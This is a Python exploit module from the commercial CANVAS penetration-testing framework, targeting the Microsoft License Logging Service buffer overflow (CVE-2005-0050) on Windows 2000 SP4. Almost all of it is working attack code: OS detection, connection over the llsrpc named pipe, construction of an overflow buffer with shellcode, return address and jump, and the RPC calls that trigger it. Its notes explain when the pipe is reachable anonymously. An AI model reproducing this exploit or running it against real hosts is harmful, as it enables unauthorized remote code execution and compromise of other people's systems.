#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import os
import getopt
import socket
import struct
import random

from exploitutils import *
from tcpexploit import tcpexploit
from msrpc import *

# GUI info
NAME='Microsoft License Logging Service Buffer Overflow'
DESCRIPTION='Microsoft License Logging Service .data Buffer Overflow'
DOCUMENTATION={}
DOCUMENTATION["CVE Name"] = "CVE-2005-0050"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0050"
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS05-010.mspx'
DOCUMENTATION['Note']=''

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']= ['2000']

CHANGELOG="""
KK 08/13/07:
- Rewritten the 2000 part
- Removed NT 4.0 part, too unreliable.
"""

NOTES="""
This exploit works on SLIPSTREAMED Windows 2000 SP4 by default 
since they kept the llsrpc pipe NULL-SESSIONABLE. But if you
installed SP4 by hand, remote anonymous access got removed. However,
you can of course use credentials to access this pipe.

How to make llsrpc pipe NULL-SESSIONABLE:
- Goto registry key-> HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\
- Right click and modify the NullSessionPipes value
1- Delete the last two 00 00 bytes
2- Add 4C 00 4C 00 53 00 52 00 50 00 43 00 00 00 00 00
3- Hit OK
4- Make sure LLSRPC pipe is added to the list successfully
- Now you can crash win2k server llssrv.exe remotely
"""

targets={
    0: ['Autoversioning N/A',0],
    1: ['Windows 2000 Server SP4',0x001f5028],
}

from msrpcexploit import msrpcexploit
from MOSDEF import mosdef

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name=NAME
        self.version=0
        self.badstring='\0'
        self.subesp=2000
        return

    def test(self):
        self.getargs()
        try:
            if self.connect('57674cd0-5200-11ce-a897-08002b2e9c6d','1.0'):
                self.port=self.myDCE.port
                self.testOS()
                return 1
        except DCEException,msg:
            self.log('Test failed: %s'%(str(msg)))
        return 0

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        print 'target=%s->%s'%(self.target,app.target)
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.connectionList=['ncacn_np:%s[\\llsrpc]'%(self.host)]
        return self.connectionList

    def connect(self,UUID,uuidversion):
        connectionList=self.buildConnectionList()
        self.myDCE=DCE(UUID,uuidversion,connectionList,covertness=self.covertness,getsock=self)
        self.myDCE.setUsername(self.user)
        self.myDCE.setPassword(self.password)
        try:
            map=self.myDCE.connect()
            if not map:
                self.raiseError('Could not connect to remote server - service is not running or the host is firewalled.')
        except DCEException,msg:
            self.log(msg)
            return 0
        self.log('Attacking %s'%(map))
        return 1

    def LlsrLicenseRequest(self,data):
        packet=''
        packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',((len(data)/2)-1))
        packet+=struct.pack('<LLLL',1,0,0,0)
        try:
            response=get_all_stubs(self.myDCE.call(0,packet,response=1))
        except Exception,emsg:
            self.log('LlsrLicenseRequest: %s'%(str(emsg)))
        return

    def LlsrConnect(self):
        packet=''
        packet+=s_dce_win2k_unistring('PHOENIX')
        self.myDCE.set_timeout(600)
        self.log('LlsrConnect')
        response=get_all_stubs(self.myDCE.call(0,packet,response=1))
        self.log('LlsrConnect response')
        if len(response)!=24:
            raise Exception,'Invalid response received!'
        handle=struct.unpack('>20s',response[:20])[0]
        status=struct.unpack('>L',response[20:])[0]
        self.log('Handle: %s Status: %d'%(hexprint(handle),status))
        if status!=0:
            self.log('LlsrConnect failed with %08x'%(status))
            return ''
        return handle

    def LlsrLicenseAdd(self,handle):
        packet=''
        packet+=handle
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<LL',0x0040d1c0,0x0040d1c4)
        packet+=struct.pack('<LLL',1,0,0)
        packet+=struct.pack('<LL',0x0040d1c8,0x0040d1cc)
        packet+=struct.pack('<LL',2,0)
        packet+=struct.pack('<L',0x0040d1d0)
        packet+=struct.pack('<LLLLL',0,0,0,0,0)
        packet+=s_dce_raw_unistring('')
        packet+=s_dce_raw_unistring('')
        packet+=s_dce_raw_unistring('')
        packet+=s_dce_raw_unistring('')
        packet+=s_dce_raw_unistring('')
        try:
            get_all_stubs(self.myDCE.call(4,packet,response=0))
        except Exception,emsg:
            self.log('LlsrLicenseAdd: %s'%(str(emsg)))
        return

    def run(self):
        self.getargs()
        if self.version==0:
            self.testOS()
            if self.version==0:
                self.log('Could not automatically determine version!')
                self.result_error=self.ERR_NO_VERSION
                return 0
        self.info,self.eip=targets[self.version]

        data=''
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)
        try:
            data+=self.shellcode
            data+='A'*(428*2-len(data))
            data+=struct.pack('<L',0xfffffffe)
            data+='B'*(434*2-len(data))
            data+=struct.pack('<L',self.eip)
            data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86')
            data+='C'*(468*2-len(data))
            data+=struct.pack('<LLL',0x01017288,0x0101768c,0x01017690) #magic DWORDs
            data+='DD'
            self.connect('57674cd0-5200-11ce-a897-08002b2e9c6d','1.0')
            self.LlsrLicenseRequest(data)
            self.connect('342cfd40-3c6c-11ce-a893-08002b2e9c6d','0.0') #implement AlterContext sometime
            handle=self.LlsrConnect()
            if handle=='':
                raise Exception,'Invalid handle returned!'
            self.LlsrLicenseAdd(handle)
        except Exception,msg:
            self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
            self.log('Failed reason: %s'%(str(msg)))
            return 0
        time.sleep(5)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%self.name)
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%self.name)

        return 0
    
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
